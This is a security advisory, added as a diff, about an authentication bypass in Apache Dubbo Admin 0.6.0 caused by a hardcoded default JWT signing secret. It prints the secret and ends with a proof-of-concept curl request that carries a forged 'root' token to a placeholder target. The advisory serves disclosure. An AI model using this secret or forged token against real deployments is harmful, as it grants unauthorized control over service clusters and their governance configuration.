@@ -1,0 +1,53 @@
+
+
+Apache Dubbo Admin 0.6.0 Hardcoded Default JWT Secret Authentication Bypass
+
+
+Vendor: The Apache Software Foundation
+Product web page: https://dubbo.apache.org
+Affected version: 0.6.0
+
+Summary: Apache Dubbo is an RPC service development framework designed
+to address service governance and communication issues in microservice
+architectures. The official implementation provides multi-language SDKs
+such as Java and Golang. Microservices developed using Dubbo inherently
+possess the ability to discover and communicate with each other remotely.
+By leveraging Dubbo's rich service governance features, you can achieve
+service discovery, load balancing, traffic scheduling, and other service
+governance requirements. Dubbo is designed to be highly extensible, allowing
+users to easily implement various custom logics for traffic interception
+and routing.
+
+Desc: Apache Dubbo Admin version 0.6.0 ships a public, hardcoded default
+JWT signing secret (admin.check.signSecret=86295dd0c4ef69a1036b0b0c15158d77)
+in application.properties, used by JwtTokenUtil to sign and verify session
+tokens (jjwt 0.6.0, HS512). Because the secret is published in the release,
+a remote unauthenticated attacker can forge a valid "root" token offline
+and send it in the Authorization header to bypass authentication entirely,
+without using the login endpoint. On any deployment where the documented
+default secret has not been changed, this grants full Dubbo Admin access,
+which by default can query and invoke the entire service cluster and modify
+governance configuration.
+
+Tested on: Microsoft Windows 10 (x86_64)
+           Eclipse Temurin OpenJDK 21.0.6 (LTS)
+           io.jsonwebtoken:jjwt:0.6.0
+           Dubbo Admin 0.6.0
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2026-6035
+Advisory URL: https://www.zeroscience.mk/#/advisories/ZSL-2026-6035
+
+
+13.08.2026
+
+--
+
+
+$ curl -s -H 'Authorization: eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJyb290IiwiaWF0IjoxNzkzMDIxMzc1LCJleHAiOjIxMDgzODEzNzV9.nHPeOBWqkOM60Dk8P4QFA16XATgqrVT3eX3syj220ClLTPTwRMr9x_ebX84_lyNipJ1Jdsy7wIJpkpAkrSl9dg' \
+> 'http://TARGET:8080/api/dev/service?pattern=service&filter=*&page=0&size=10' \
+> -H 'User-Agent: MoAB/2.5.01'
